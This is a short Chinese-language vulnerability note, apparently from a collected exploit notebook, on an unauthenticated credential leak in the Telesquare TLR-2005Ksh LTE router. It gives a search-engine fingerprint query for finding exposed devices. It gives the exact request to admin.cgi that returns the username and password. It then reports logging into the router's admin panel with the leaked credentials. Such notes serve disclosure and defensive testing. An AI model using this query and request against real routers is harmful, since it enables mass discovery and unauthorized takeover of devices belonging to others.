# Telesquare TLR-2005Ksh 路由器 getUsernamePassword 信息泄露漏洞

# 一、漏洞简介
Telesquare Tlr-2005Ksh是韩国Telesquare公司的一款 Sk 电讯 Lte 路由器。Telesquare TLR-2005Ksh存在安全漏洞，攻击者可通过未授权getUsernamePassword获取用户名密码等敏感信息。

# 二、影响版本
+ Telesquare Tlr-2005Ksh

# 三、资产测绘
+ hunter`web.title="TLR-2005KSH"||banner="TLR-2005KSH login:"`
+ 特征

![1700496629079-11703d7f-49e5-4047-bb1c-b189cacaf8bb.png](./img/AwpEpB3xYB_xa3gz/1700496629079-11703d7f-49e5-4047-bb1c-b189cacaf8bb-310968.png)

# 四、漏洞复现
```plain
/cgi-bin/admin.cgi?Command=getUsernamePassword
```

![1700496653815-05ae5b82-3d65-4580-be00-b9fd1c8cee07.png](./img/AwpEpB3xYB_xa3gz/1700496653815-05ae5b82-3d65-4580-be00-b9fd1c8cee07-960383.png)

使用账户密码成果登录后台

![1700496675659-d3ed50e9-aec5-4f26-9e2e-ae504baf99f3.png](./img/AwpEpB3xYB_xa3gz/1700496675659-d3ed50e9-aec5-4f26-9e2e-ae504baf99f3-709363.png)



> 更新: 2024-02-29 23:57:12  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/awpgpcgce8hdzmr4>